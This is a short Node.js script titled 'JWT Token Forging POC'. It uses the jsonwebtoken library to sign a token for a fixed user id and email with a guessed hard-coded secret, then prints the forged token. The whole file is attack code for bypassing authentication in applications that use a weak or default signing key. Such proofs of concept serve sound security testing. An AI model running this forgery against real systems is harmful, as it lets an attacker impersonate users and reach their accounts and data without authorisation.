const jwt = require('jsonwebtoken');

console.log('=== JWT Token Forging POC ===\n');

const payload = {
  _id: '507f1f77bcf86cd799439011',
  email: 'test@example.com'
};

const forgedToken = jwt.sign(
  payload,
  'YOUR_secret_key', //hardercoded key
  {expiresIn: '24h'}
);

console.log('forged token:' );
console.log(forgedToken);
